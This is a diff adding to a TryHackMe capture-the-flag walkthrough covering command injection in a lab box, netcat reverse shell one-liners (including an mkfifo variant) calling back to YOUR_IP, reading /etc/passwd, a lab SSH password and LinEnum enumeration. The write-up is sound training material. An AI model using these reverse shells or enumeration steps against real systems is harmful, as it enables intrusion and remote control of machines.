@@ -104,3 +104,66 @@ secretpass
 
 ### 3. How many forms of SQLI is the form vulnerable to?
 3
+
+## 5. Command Execution
+link where we put commands: `http://IP/SOME_NUMBER.php`
+
+we now run: `nc -nlvp 4242` on our machine, to listen for connections
+
+-l: listen mode, for inbound connects
+
+-n: numeric-only IP addresses, no DNS
+
+-p: local port number
+
+-v: verbose
+
+and run this command in the administrator command box: `nc -e /bin/sh YOUR_IP 4242`
+
+well. that didn't work. let's try: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4242 >/tmp/f`
+
+[Source](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+[Source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)
+
+Quick Tip: Get you ip by typing in `ifconfig`. Since we have connected to a VPN, we have to look at `tun0`. run: `ifconfig tun0` and the `destination` is your IP address. 
+
+If that sounds complex, go to https://tryhackme.com/access with VPN connected, and it'll show you want you need.
+
+Quick Note: you can choose any port, 4242 is arbitary :P
+
+### 1. How many files are in the current directory?
+run `ls` in the command form (even before we get access)
+
+3
+
+### 2. Do I still have an account?
+`cat /etc/passwd` shows `pingu:x:1002:1002::/home/pingu:/bin/bash` at the end.
+
+yes
+
+### 3. What is my ssh password?
+Traversing through the directory we have a user named `pingu`, and in the `.ssh` folder, we have `id_rsa` and `id_rsa.pub`. This is interesting.
+But, for now lets focus on getting the password. Trying to seach using `find -u pingu` yields nothing. however, going around the directory we landed into shows a `hidden` folder; inside is our password! Its owned by `www-data` though ... hmmm ....
+
+pinguapingu
+
+### Having fun
+running `ssh pingu@IP` gives us access to the machine, using the password above. and ... well maybe i got too excited
+
+```
+pingu@ubuntu:~$ sudo su
+[sudo] password for pingu: 
+pingu is not in the sudoers file.  This incident will be reported.
+```
+
+lmao
+
+
+## 6. LinEnum
+We need to get the linenum file into pingu's machine now. how? the room mentions using `SCP` which we can do since we have ssh-ed into the machine.
+
+After copying using: `scp /path/to/LinEnum.sh pingu@IP:/tmp`, just do `chmod +x LinEnum.sh` and run.
+
+### 1. What is the interesting path of the interesting suid file?
+/opt/secret/root
